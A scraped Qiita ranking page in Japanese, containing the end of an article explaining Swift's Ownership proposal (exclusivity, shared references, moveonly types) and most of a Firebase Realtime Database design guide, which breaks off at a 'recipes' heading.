        <span class="n">cat</span><span class="p">.</span><span class="n">age</span> <span class="o">*</span> <span class="mi">2</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="n">main</span><span class="p">()</span>
</pre></div></div>

<p>以下のエラーメッセージが出ます。</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">error.txt</span></div>
<div class="highlight"><pre><span></span>/Users/omochi/github/omochi/swift-ownership-example/x02_loe-mutating/Sources/x02_loe-mutating/main.swift:10:5: error: overlapping accesses to 'cat', but modification requires exclusive access; consider copying to a local variable
    cat.updateAge {
    ^~~
/Users/omochi/github/omochi/swift-ownership-example/x02_loe-mutating/Sources/x02_loe-mutating/main.swift:11:13: note: conflicting access is here
        cat.age * 2
        ~~~~^~~
</pre></div>
</div>

<p>updateAge は mutating func なので、このメソッド呼び出しはレシーバ cat に対する書き込みアクセスです。その呼び出しの最中に、引数に渡されたクロージャからも cat に読み込みアクセスをしています。書き込みアクセスの最中は他のアクセスが禁止されるためエラーになります。</p>

<p>このように、排他則はプログラマに制約を課すものであり、一見不便が生じてしまいますが、値の同時アクセスの可能性を考慮したプログラムを書くのは難しく、考慮漏れがあるとバグにつながるため、それを未然に防いでくれます。</p>

<h2>
<span id="最適化" class="fragment"></span><a href="#%E6%9C%80%E9%81%A9%E5%8C%96"><i class="fa fa-link"></i></a>最適化</h2>

<p>また、排他則があることで適用できるようになる最適化があり、高速なコードにコンパイルできる場合があります。そのような最適化の例として、コピーオンライト型のユニーク性チェックの巻き上げを紹介します。</p>

<p>Arrayのようなコピーオンライトな型では、何か書き込み操作が生じる直前に、その内部ストレージの参照カウンタを調べて、複数箇所から共有参照されているかどうか調べます。一箇所だけから参照されているとき、その参照はユニークなので、これをユニーク性のチェックといいます。もし共有されていた場合は、操作の前にストレージを複製します。</p>

<p>以下のコードを見てください。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">extension</span> <span class="nc">Array</span> <span class="p">{</span>
    <span class="kr">mutating</span> <span class="kd">func</span> <span class="nf">update</span><span class="p">(</span><span class="kc">_</span> <span class="n">f</span><span class="p">:</span> <span class="p">()</span> <span class="p">-&gt;</span> <span class="n">Element</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="mf">0.</span><span class="p">.&lt;</span><span class="bp">count</span> <span class="p">{</span>
            <span class="kc">self</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="n">f</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>このコードはArrayの要素をクロージャの返り値によって更新しています。もしかするとupdateが以下のように呼び出されているかもしれません。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span>    <span class="kd">var</span> <span class="nv">xs</span><span class="p">:</span> <span class="p">[</span><span class="nb">Int</span><span class="p">]</span> <span class="p">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">]</span>
    <span class="kd">var</span> <span class="nv">ys</span><span class="p">:</span> <span class="p">[</span><span class="nb">Int</span><span class="p">]</span> <span class="p">=</span> <span class="p">[]</span>
    <span class="n">xs</span><span class="p">.</span><span class="n">update</span> <span class="p">{</span>
        <span class="n">ys</span> <span class="p">=</span> <span class="n">xs</span>
        <span class="k">return</span> <span class="mi">10</span>
    <span class="p">}</span>
</pre></div></div>

<p>update に渡しているクロージャの中で xs が ys にコピーされています。よって、update 内部で 引数 f を呼び出すと、xs の内部ストレージが ys と共有され、複数箇所から参照された状態になります。</p>

<p>このように、渡されたクロージャが共有を生じさせる可能性があるので、コンパイラはループ内部の self[i] に代入する直前でユニーク性のチェックをするコードを生成しなければなりません。このループは要素数だけ繰り返されるので、チェックコストは大きくなります。</p>

<p>ここで排他則が導入されれば、このようなクロージャが渡される可能性が排除されます<sup id="fnref1"><a href="#fn1" rel="footnote" title="このサンプルコードは、コンパイラの排他則の検証がバグっていて、「間違ってコンパイルできてしまう」ため、バグ報告しておきました。">1</a></sup>。update は mutating func による書き込みアクセスであり、その他のアクセスが禁止されるからです。その結果、ユニーク性のチェックはループ突入前に1度だけ行えばよくなります。これをユニーク性のチェックの巻き上げ最適化といいます。</p>

<h1>
<span id="shared-参照" class="fragment"></span><a href="#shared-%E5%8F%82%E7%85%A7"><i class="fa fa-link"></i></a>shared 参照</h1>

<p>提案されている第2の機能は、shared 参照というものです。</p>

<p>swift にはすでに inout 参照による inout 渡しがあります。これは関数の引数へ値を渡すときに、値をコピーして渡す代わりに変数への参照を渡すものです。そしてこの参照は変数の値への書き込みアクセスとなります。</p>

<p>通常の引数は、関数を呼び出す際に値がコピーされるため、コストがかかります。実は、 inout 渡しは、そのストレージへのポインタを渡すだけであり、そのようなコピーコストがかからず高速です。</p>

<p>shared 参照はこれの読み取り専用版です。inout 渡しでは、関数内部からその引数を var のように扱い、値を「書き戻す」事ができましたが、shared 渡しでは、その引数は let のように扱われ、読み取り専用となります。</p>

<p>inout 渡しでは、呼び出し側にアンパサンド(&amp;)をつける必要があり、変数などのストレージの式を渡す必要がありますが、 shared はアンパサンドは不要で、一般の値が渡せます。つまり、使い心地は通常の引数とほとんど変わりません。</p>

<p>以下にコード例を示します。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">func</span> <span class="nf">getLength</span><span class="p">(</span><span class="kc">_</span> <span class="n">v</span><span class="p">:</span> <span class="n">shared</span> <span class="n">Vec2</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="nb">Float</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">sqrt</span><span class="p">(</span><span class="n">v</span><span class="p">.</span><span class="n">x</span> <span class="o">*</span> <span class="n">v</span><span class="p">.</span><span class="n">x</span> <span class="o">+</span> <span class="n">v</span><span class="p">.</span><span class="n">y</span> <span class="o">*</span> <span class="n">v</span><span class="p">.</span><span class="n">y</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">getLength</span><span class="p">(</span><span class="n">Vec2</span><span class="p">(</span><span class="n">x</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">y</span><span class="p">:</span> <span class="mi">1</span><span class="p">))</span>
<span class="p">}</span>
</pre></div></div>

<p>呼び出され側で v を使っているところと、呼び出し側で Vec2 を渡しているところを見ると、特に通常の引数と変わらないことがわかります。このように、shared は使いやすくて高速な引数の渡し方となります。</p>

<p>ただし、shared 渡しされている値は、その関数の呼び出しの間ずっと、読み込みアクセスされることに注意が必要です。先述した排他則により制約をうける場合があります。</p>

<h2>
<span id="参照仕様の発展" class="fragment"></span><a href="#%E5%8F%82%E7%85%A7%E4%BB%95%E6%A7%98%E3%81%AE%E7%99%BA%E5%B1%95"><i class="fa fa-link"></i></a>参照仕様の発展</h2>

<p>shared と inout は「第一級の参照」にはしないという方針が示されています。返り値や変数の型など、他の型と同じようにどこでも使えるようにはしないということです。第一級の参照が入ると言語や型システムが難解になり、それにより得られるメリットよりも、苦労のほうが大きいとのことです。</p>

<p>第一級にはなりませんが、参照に関する発展的な仕様として、ローカル束縛、for-in 対応、computed property 対応などが議論されています。特に後者の2つはその実現のために言語仕様へのコルーチンの導入が同時に提案されており、今後の方向性として興味深いですが、この記事では省略します。</p>

<h1>
<span id="コピー不可能な値型" class="fragment"></span><a href="#%E3%82%B3%E3%83%94%E3%83%BC%E4%B8%8D%E5%8F%AF%E8%83%BD%E3%81%AA%E5%80%A4%E5%9E%8B"><i class="fa fa-link"></i></a>コピー不可能な値型</h1>

<p>提案されている第3の機能は、コピー不可能な値型です。値型を定義する際に、これはコピーができない型である、と指定できるようになります。コピー不可能である事を、ムーブのみ可能であると捉えて、 moveonly というキーワードを使用することが提案されています。</p>

<p>ムーブというのは、ある変数からある変数に値を移す操作で、元の変数は未初期化状態に戻って使用不可能になります。以下に例を示します。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="n">moveonly</span> <span class="kd">struct</span> <span class="nc">Stone</span> <span class="p">{}</span>

<span class="kd">var</span> <span class="nv">a</span> <span class="p">=</span> <span class="n">Stone</span><span class="p">()</span>

<span class="c1">// a から b に Stone が移動する</span>
<span class="kd">var</span> <span class="nv">b</span> <span class="p">=</span> <span class="n">move</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

<span class="c1">// a は未初期化であるため、コンパイルエラー</span>
<span class="bp">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</pre></div></div>

<p>大きな値型を moveonly にしておけば、代入文がコンパイルエラーになるので、<br>
コストの高い代入文をうっかり書くことを禁止できます。本当に必要な場面では、明示的に init などで複製します。</p>

<h2>
<span id="raii" class="fragment"></span><a href="#raii"><i class="fa fa-link"></i></a>RAII</h2>

<p>deinit が定義できるので、今まで適用できなかったパターンに値型が適用できるようになります。</p>

<p>例えば、開かれたファイルハンドルを class で表現することがあります。そして init でファイルパスを与えて開き、 deinit でそれを閉じるようにします。すると、そのインスタンスへの参照が無くなった時点でインスタンスの解放と共にファイルハンドルが閉じられるので、閉じ忘れや、二重に閉じてしまうバグが回避できます。このような実装パターンを RAII と呼びます。</p>

<p>しかし、 class の取り回しには参照カウンタ操作やヒープ使用のコストがかかるため、できることなら値型を使いたいのが swift です。ですが、値型ではこのパターンは使えませんでした。deinit が書けないうえ、代入文でコピーできてしまうため、その時点で1つの同一リソースを指す2つの実体が生まれ、破綻してしまうからです。</p>

<p>moveonly では deinit が定義できるうえ、コピーができないので、このような場合に最適です。以下に例を示します。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="n">moveonly</span> <span class="kd">struct</span> <span class="nc">FileHandle</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nv">fp</span><span class="p">:</span> <span class="nb">UnsafeMutablePointer</span><span class="p">&lt;</span><span class="n">FILE</span><span class="p">&gt;</span>

    <span class="kd">init</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fp</span> <span class="p">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="kd">deinit</span> <span class="p">{</span>
        <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>なお、関数の引数は呼び出し時にコピーが生じるので、コピー不可能な型は渡せません。そこで、前述した shared 渡し を活用していくことになります。そして、参照を使うことによる重複アクセスによるバグを排他則が防いでくれます。</p>

<h1>
<span id="終わりに" class="fragment"></span><a href="#%E7%B5%82%E3%82%8F%E3%82%8A%E3%81%AB"><i class="fa fa-link"></i></a>終わりに</h1>

<p>以上が Ownership の大きな3つの機能です。</p>

<p>Ownership が入ったら Swift は上級者向けの難解言語になるだろう、といった意見を見たことがありますが、自分はそのようなことは起こらないと考えています。全体の目標として、これまでのSwiftの使いやすさを保ちつつ、高速化の手段を追加的に提供するとあるのですが、現状の提案を見る限り、注意深くそれを達成できていると思うからです。</p>

<p>この記事を見て、 Ownership に興味を持つ人が増えたら嬉しいです。</p>

<div class="footnotes">
<hr>
<ol>

<li id="fn1">
<p>このサンプルコードは、コンパイラの排他則の検証がバグっていて、「間違ってコンパイルできてしまう」ため、<a href="https://bugs.swift.org/browse/SR-6103" rel="nofollow noopener" target="_blank">バグ報告</a>しておきました。 <a href="#fnref1">↩</a></p>
</li>

</ol>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">96位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>90</kbd>
		<a target="_blank" href="https://qiita.com/Yatima/items/8a54acc8fda3e5fce741">結局Firebaseのdbでは何に気をつけるべきか？少しマニアックな内容も含め，わかりやすく説明する(realtime database)</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-03<br />23:08:40</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/17440.html">Yatima</a>(16件の記事)<br />(株式会社みんコレ 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/17440/profile-images/1473682159">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Android]</b> <b>[iOS]</b> <b>[AngularJS]</b> <b>[vue.js]</b> <b>[Firebase]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>Firebaseのrealtime databaseはいわゆるNoSQLであり，馴染みが薄い人が多いとともに，一般に流布している情報はふわっとしていてわかりづらい．<br>
山に篭って修行していたらある程度知見が溜まってきたため，下山して共有する．</p>

<p><strong>追記：</strong><br>
新しいdbが発表されたので雑感書きました．<br>
<a href="https://qiita.com/Yatima/items/54ea22d0cea1acc6cbcb" id="reference-f782d6f543f725e78cf3">Firebase RTDB + GCP datastore = Firestoreについて第一印象</a></p>

<h1>
<span id="tldr" class="fragment"></span><a href="#tldr"><i class="fa fa-link"></i></a>tl;dr</h1>

<p><strong>割り切れ！</strong><br>
<strong>ユーザの見えるままに作れ！</strong><br>
それ以外の細末は下記参照</p>

<h1>
<span id="大原則その1割り切り" class="fragment"></span><a href="#%E5%A4%A7%E5%8E%9F%E5%89%87%E3%81%9D%E3%81%AE1%E5%89%B2%E3%82%8A%E5%88%87%E3%82%8A"><i class="fa fa-link"></i></a>大原則その1：割り切り</h1>

<p>これは特にRDB勢に気をつけていただきたい．<br>
我々は少し気を抜くと，<strong>つい正規化したがり屋さん</strong>になってしまう．<br>
（その意味では，むしろ開発経験が少ない人のほうが習得しやすいかもしれない）</p>

<p>Firebaseにおいて<strong>正規化はほぼ無駄</strong>と思ってもらっていい．<br>
（理由は後述）<br>
頑として非正規化を貫くべきだ（割り切り）．</p>

<p>では，どう非正規化しろと言うのか．<br>
巷では良く「ネストを浅くしろ」だの「非正規化しろ」だの言われるが，<strong>どのくらいどうすりゃいいんだよ！</strong></p>

<h1>
<span id="大原則その2ユーザの見えるままに設計する" class="fragment"></span><a href="#%E5%A4%A7%E5%8E%9F%E5%89%87%E3%81%9D%E3%81%AE2%E3%83%A6%E3%83%BC%E3%82%B6%E3%81%AE%E8%A6%8B%E3%81%88%E3%82%8B%E3%81%BE%E3%81%BE%E3%81%AB%E8%A8%AD%E8%A8%88%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>大原則その2：ユーザの見えるままに設計する</h1>

<p>これである．<br>
だいたいまずこれで解決できる．</p>

<p>つまりまず<strong>ビューありき</strong>なのだ（割り切り）．<br>
<strong>dbを先に設計してはならない．</strong><br>
（ビューを変更するときどうするか，は後述）</p>

<p>なぜそうしたほうがいいのか？</p>

<h2>
<span id="コードはシンプルなほうがいい" class="fragment"></span><a href="#%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AF%E3%82%B7%E3%83%B3%E3%83%97%E3%83%AB%E3%81%AA%E3%81%BB%E3%81%86%E3%81%8C%E3%81%84%E3%81%84"><i class="fa fa-link"></i></a>コードはシンプルなほうがいい</h2>

<p>当然と言えば当然である．<br>
スパゲッティ遊びしたい人は少数だろう．</p>

<p>実は<strong>ビューありきでdb設計することによって，コードをシンプルにできる</strong>のだ．</p>

<p>勘のいいかたはおわかりだろうが，dbからread後の処理が最低限で済む．<br>
ある意味<a href="https://ja.wikipedia.org/wiki/%E6%99%82%E9%96%93%E3%81%A8%E7%A9%BA%E9%96%93%E3%81%AE%E3%83%88%E3%83%AC%E3%83%BC%E3%83%89%E3%82%AA%E3%83%95" rel="nofollow noopener" target="_blank">時間と空間のトレードオフ</a>に近いものと思って良いだろう．</p>

<p>（知らない人には申し訳ないが）js界隈で話題になりがちなVuexやFlux, Reduxのような状態管理もほぼ不要となる（割り切り．詳細後述）．</p>

<p>あるいはもっと深い理由として，こんなものがある．</p>

<h2>
<span id="システム全体としての効率化" class="fragment"></span><a href="#%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E5%85%A8%E4%BD%93%E3%81%A8%E3%81%97%E3%81%A6%E3%81%AE%E5%8A%B9%E7%8E%87%E5%8C%96"><i class="fa fa-link"></i></a>システム全体としての効率化</h2>

<p>実ユーザにおいては，圧倒的に書き込み数＜＜読み込み数である．<br>
従って，効率化する（システム全体のパフォーマンスを上げる）ためには，なるべく<strong>読み込みをスピーディにするのが理に適っている</strong>．</p>

<p>極端にも見える「ユーザの見えるままに」アプローチが確立された背景として，このようなことが挙げられるわけだ．<br>
これらを踏まえると，むしろ従来の考え方を持ち込むのは害悪にしかならないことがわかる（割り切り）．</p>

<p>「ユーザの見えるままに」を踏まえたところで，もう少し細かい原則を見ていこう．</p>

<h1>
<span id="原則" class="fragment"></span><a href="#%E5%8E%9F%E5%89%87"><i class="fa fa-link"></i></a>原則</h1>

<h2>
<span id="原則その1dbはツリー状" class="fragment"></span><a href="#%E5%8E%9F%E5%89%87%E3%81%9D%E3%81%AE1db%E3%81%AF%E3%83%84%E3%83%AA%E3%83%BC%E7%8A%B6"><i class="fa fa-link"></i></a>原則その1：dbはツリー状</h2>

<p>json形式である．<br>
というのは自明だが，key内にスラッシュが含まれていた場合は，その階層まで潜ると解釈される．</p>

<div class="code-frame" data-lang="json">
<div class="code-lang"><span class="bold">slashed.json</span></div>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">"users/XXXXX/name"</span><span class="p">:</span> <span class="s2">"yatima"</span><span class="p">}</span>
</pre></div>
</div>

<p>とwriteすると</p>

<div class="code-frame" data-lang="json">
<div class="code-lang"><span class="bold">nested.json</span></div>
<div class="highlight"><pre><span></span><span class="p">{</span>
  <span class="nt">"users"</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">"XXXXX"</span><span class="p">:</span> <span class="p">{</span>
      <span class="nt">"name"</span><span class="p">:</span> <span class="s2">"yatima"</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>として反映される．</p>

<h2>
<span id="原則その2ノード以下まるごとread" class="fragment"></span><a href="#%E5%8E%9F%E5%89%87%E3%81%9D%E3%81%AE2%E3%83%8E%E3%83%BC%E3%83%89%E4%BB%A5%E4%B8%8B%E3%81%BE%E3%82%8B%E3%81%94%E3%81%A8read"><i class="fa fa-link"></i></a>原則その2：ノード以下まるごとread</h2>

<p>課金やパフォーマンスとの関与が大きい話ではある（基本的に<a href="https://firebase.google.com/pricing/" rel="nofollow noopener" target="_blank">read時のダウンロードサイズに対して従量課金</a>）．</p>

<p>readでは，<code>.ref()</code>で指定したノードそれ以下の全てのデータを取得する．</p>

<div class="code-frame" data-lang="js">
<div class="code-lang"><span class="bold">fetch-good.js</span></div>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">db</span> <span class="o">=</span> <span class="nx">firebase</span><span class="p">.</span><span class="nx">database</span><span class="p">()</span>
<span class="kr">const</span> <span class="nx">hogeRef</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">ref</span><span class="p">(</span><span class="s1">'hoge'</span><span class="p">)</span>
<span class="nx">hogeRef</span><span class="p">.</span><span class="nx">on</span><span class="p">(...</span><span class="nx">省略</span><span class="p">...)</span>
</pre></div>
</div>

<p>とすると，<code>/hoge/</code>以下のみを取得する．</p>

<div class="code-frame" data-lang="js">
<div class="code-lang"><span class="bold">fetch-yabai.js</span></div>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">db</span> <span class="o">=</span> <span class="nx">firebase</span><span class="p">.</span><span class="nx">database</span><span class="p">()</span>
<span class="kr">const</span> <span class="nx">dbRef</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">ref</span><span class="p">()</span>
<span class="nx">dbRef</span><span class="p">.</span><span class="nx">child</span><span class="p">(</span><span class="s1">'hoge'</span><span class="p">).</span><span class="nx">on</span><span class="p">(...</span><span class="nx">省略</span><span class="p">...)</span>
</pre></div>
</div>

<p>とすると全部ごそっと取得することになり，悲しみが生まれる．</p>

<p>ただしクエリを含めた場合は，それに該当する分のみ取得される．</p>

<h2>
<span id="原則その3連番は使わない" class="fragment"></span><a href="#%E5%8E%9F%E5%89%87%E3%81%9D%E3%81%AE3%E9%80%A3%E7%95%AA%E3%81%AF%E4%BD%BF%E3%82%8F%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>原則その3：連番は使わない</h2>

<p>例えばカウンタなどで，ほぼ同時にwriteが行われたとすると，残念なことになる．<br>
（一人目が書き込み終わる前に二人目が読み込んでしまうと，二人ともカウンタを1増やしたつもりが最終的に1しか増えない）<br>
<code>.push()</code>を使うと，<strong>一意なIDをkeyとして書き込み</strong>できる．</p>

<div class="code-frame" data-lang="js">
<div class="code-lang"><span class="bold">push.js</span></div>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">db</span> <span class="o">=</span> <span class="nx">firebase</span><span class="p">.</span><span class="nx">database</span><span class="p">()</span>
<span class="kr">const</span> <span class="nx">hogeRef</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">ref</span><span class="p">(</span><span class="s1">'hoge'</span><span class="p">)</span>
<span class="nx">hogeRef</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">'fuga'</span><span class="p">)</span>
</pre></div>
</div>

<p>と書き込むと</p>

<div class="code-frame" data-lang="json">
<div class="code-lang"><span class="bold">db.json</span></div>
<div class="highlight"><pre><span></span><span class="p">{</span>
  <span class="nt">"hoge"</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">"&lt;XXX-unique-id-XXX&gt;"</span><span class="p">:</span> <span class="s2">"fuga"</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>となる．</p>

<p>逆に言えば，<code>.push()</code>を使わない場合は<strong>変に上書きされても問題ない前提で</strong>開発すべきである．</p>

<h2>
<span id="原則その31配列を使わない" class="fragment"></span><a href="#%E5%8E%9F%E5%89%87%E3%81%9D%E3%81%AE31%E9%85%8D%E5%88%97%E3%82%92%E4%BD%BF%E3%82%8F%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>原則その3.1：配列を使わない</h2>

<p>その3と似た理由で，配列（Array）は推奨されない．<br>
連想配列（Object）に自動で変換されるが，その際に<strong>keyが連番で割り当てられてしまう</strong>からである．</p>

<h2>
<span id="原則その4一貫性のある同時書き込み" class="fragment"></span><a href="#%E5%8E%9F%E5%89%87%E3%81%9D%E3%81%AE4%E4%B8%80%E8%B2%AB%E6%80%A7%E3%81%AE%E3%81%82%E3%82%8B%E5%90%8C%E6%99%82%E6%9B%B8%E3%81%8D%E8%BE%BC%E3%81%BF"><i class="fa fa-link"></i></a>原則その4：一貫性のある同時書き込み</h2>

<p>単に<strong>同時書き込みするだけで一貫性が保たれる</strong>仕様である．</p>

<div class="code-frame" data-lang="js">
<div class="code-lang"><span class="bold">multi-path-write.js</span></div>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">db</span> <span class="o">=</span> <span class="nx">firebase</span><span class="p">.</span><span class="nx">database</span><span class="p">()</span>
<span class="kr">const</span> <span class="nx">dbRef</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">ref</span><span class="p">()</span>

<span class="kr">const</span> <span class="nx">newPost</span> <span class="o">=</span> <span class="p">{</span>
  <span class="nx">hoge</span><span class="o">:</span> <span class="s2">"fuga"</span>
<span class="p">}</span>
<span class="kd">let</span> <span class="nx">updates</span> <span class="o">=</span> <span class="p">{}</span>
<span class="nx">updates</span><span class="p">[</span><span class="s1">'foo'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">newPost</span>
<span class="nx">updates</span><span class="p">[</span><span class="s1">'bar'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">newPost</span>
<span class="nx">dbRef</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">updates</span><span class="p">)</span>
</pre></div>
</div>

<p>とすると</p>

<div class="code-frame" data-lang="json">
<div class="code-lang"><span class="bold">db.json</span></div>
<div class="highlight"><pre><span></span><span class="p">{</span>
  <span class="nt">"foo"</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">"hoge"</span><span class="p">:</span> <span class="s2">"fuga"</span>
  <span class="p">},</span>
  <span class="nt">"bar"</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">"hoge"</span><span class="p">:</span> <span class="s2">"fuga"</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>となる．<br>
サーバ側でvalidateすることも可能だが，不要だとは思われる．一応示しておく；</p>

<div class="code-frame" data-lang="json">
<div class="code-lang"><span class="bold">consistency.rules.json</span></div>
<div class="highlight"><pre><span></span><span class="p">{</span>
  <span class="nt">"test"</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">".write"</span><span class="p">:</span> <span class="s2">"true"</span><span class="p">,</span>
    <span class="nt">"foo"</span><span class="p">:</span> <span class="p">{</span>
      <span class="nt">".validate"</span><span class="p">:</span> <span class="s2">"true"</span>
    <span class="p">},</span>
    <span class="nt">"bar"</span><span class="p">:</span> <span class="p">{</span>
      <span class="nt">".validate"</span><span class="p">:</span> <span class="s2">"newData.val() == newData.parent().child('foo').val()"</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>間違っても<strong><code>.transaction()</code>など使ってはならない</strong>．<br>
（一ノードに対してしか使えない＝rootに近いノードを指定するハメになる，そして<a href="https://firebase.google.com/docs/reference/js/firebase.database.Reference#transaction" rel="nofollow noopener" target="_blank">トランザクションはreadが発生</a>する ⇒ 諭吉ジャブジャブ，性能にも影響）</p>

<p>と，比較的重要な原則についても紹介してきたが，いずれにせよあくまで大原則に沿った話である．<br>
大原則が通用しない場合はどうすべきだろうか．</p>

<h1>
<span id="大原則が通用しない時" class="fragment"></span><a href="#%E5%A4%A7%E5%8E%9F%E5%89%87%E3%81%8C%E9%80%9A%E7%94%A8%E3%81%97%E3%81%AA%E3%81%84%E6%99%82"><i class="fa fa-link"></i></a>大原則が通用しない時</h1>

<h2>
<span id="ビューが強く動的に生成される" class="fragment"></span><a href="#%E3%83%93%E3%83%A5%E3%83%BC%E3%81%8C%E5%BC%B7%E3%81%8F%E5%8B%95%E7%9A%84%E3%81%AB%E7%94%9F%E6%88%90%E3%81%95%E3%82%8C%E3%82%8B"><i class="fa fa-link"></i></a>ビューが強く動的に生成される</h2>

<p>ここでの動的とは，静的ファイルが準備されていないという程度の意味ではない．<br>
検索のような，ユーザの入力を元にビューを変化させたい，そういったニュアンスである．</p>

<h3>
<span id="検索" class="fragment"></span><a href="#%E6%A4%9C%E7%B4%A2"><i class="fa fa-link"></i></a>検索</h3>

<p>検索には，<a href="https://www.algolia.com/" rel="nofollow noopener" target="_blank">Algolia</a>という外部サービスを利用する（割り切り）．<br>
Firebase公式より<a href="https://github.com/firebase/functions-samples/tree/master/fulltext-search" rel="nofollow noopener" target="_blank">連携サンプル</a>も提示されている．<br>
ただしどうやらこのサービスはORやワイルドカードなどは使えないように見える．</p>

<p>他にも<a href="https://github.com/firebase/flashlight" rel="nofollow noopener" target="_blank">Flashlight</a>というElasticSearchとの連携があったりなかったりする．<br>
ワイルドカードは使えるとのことだが，公開されているサンプルはうまく動かない．</p>

<h3>
<span id="フィルタ" class="fragment"></span><a href="#%E3%83%95%E3%82%A3%E3%83%AB%E3%82%BF"><i class="fa fa-link"></i></a>フィルタ</h3>

<p>フィルタに関しては内部で解決可能と思われる．<br>
基本的にはフィルタのパターン数に応じ対策も変わる．<br>
ざっくり言って，</p>

<p>フィルタのパターン数が多いならば，インデックスを貼る．<br>
必要があればクライアント側で集合演算も行う．<br>
（ANDのみならインデックス貼りまくるだけで可能だが，ORがあると厳しい）<br>
JavaScriptなら<a href="https://lodash.com/docs/4.17.4" rel="nofollow noopener" target="_blank">lodash</a>など使うと良い．</p>

<p>フィルタのパターン数がそこまで多くないならば，クエリを駆使する．<br>
クエリについては，公式で良い解説動画がある（日本語字幕付き）．<br>
<a href="https://youtu.be/sKFLI5FOOHs?t=9m2s" rel="nofollow noopener" target="_blank">Common SQL Queries converted for the Firebase Database - The Firebase Database For SQL Developers #4</a><br>
hackyな手法にも見えるが，性能に大きな影響を与えないためのFirebaseの流儀である．</p>

<p>詳細は後述しよう．</p>

<h2>
<span id="そもそもビューがない" class="fragment"></span><a href="#%E3%81%9D%E3%82%82%E3%81%9D%E3%82%82%E3%83%93%E3%83%A5%E3%83%BC%E3%81%8C%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>そもそもビューがない</h2>

<p>もし<a href="https://firebase.google.com/products/functions/" rel="nofollow noopener" target="_blank">Functions</a>や他サーバなどから機械的にreadする必要がある場合は，「readする時使いやすいように」で良いと思われる．<br>
なるべく事前に準備しておくという意味で，「ユーザの見えるままに」とは共通する．</p>

<p>機械によるreadもなく，保存自体が主な目的の場合は（ログなど？），まぁ好きにしたらいい．</p>

<h1>
<span id="レシピ加筆中" class="fragment"></span><a href="#%E3%83%AC%E3%82%B7%E3%83%94%E5%8A%A0%E7%AD%86%E4%B8%AD"><i class="fa fa-link"></i></a>レシピ（加筆中）</h1>

<h2>
